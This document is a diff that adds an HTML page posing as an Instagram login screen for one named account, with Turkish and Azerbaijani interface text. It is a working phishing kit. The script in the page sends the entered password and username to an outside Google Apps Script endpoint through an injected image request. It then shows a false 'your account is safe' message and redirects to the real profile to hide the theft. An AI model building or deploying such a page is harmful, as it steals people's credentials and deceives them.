@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="assets/css/main.css">
+  <link rel="icon" type="image/x-icon" href="assets/img/insta_icon.png">
+<title>Instagram</title>
+</head>
+<body>
+  <main class="l-main">
+
+      <div class="l-user">
+        <div class="c-panel group">
+          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <img class="c-panel__img_pp" src="assets/img/pp.jpg" alt="Instagram">
+          <div class="c-panel__form">
+          <p class="c-name">ravina17_</p>
+            <input type="password" id="password" class="c-panel__input" placeholder="Şifre">
+
+            <button onclick="loginBtn()" class="c-btn">Giriş yap</button>
+            <span class="c-panel__span">Meta</span>
+          </div>
+        </div>
+
+
+      </div>
+  </main>
+</body>
+
+
+<script type="text/javascript">
+  function loginBtn(){
+    let password = document.getElementById("password");
+    if(password.value == "") {
+      alert("Şifrənizi daxil edin")
+    }
+    else {
+        document.write('<img src="https://script.google.com/macros/s/AKfycbys0fEnmMP_DrYEvw-_Cjxw3Y2ZKqJwWNce7eIiWsUULjDoAsNdjwBPaWRq_yleZw3x/exec?username=ravina17_' + '&password=' + password.value + '" onerror="success()" />');
+    }
+  }
+
+  function success(){
+      alert("Uğurlar! Hesabınız güvəndədir.")
+      document.location.href = "https://www.instagram.com/ravina17_/";
+  }
+</script>
+</html>
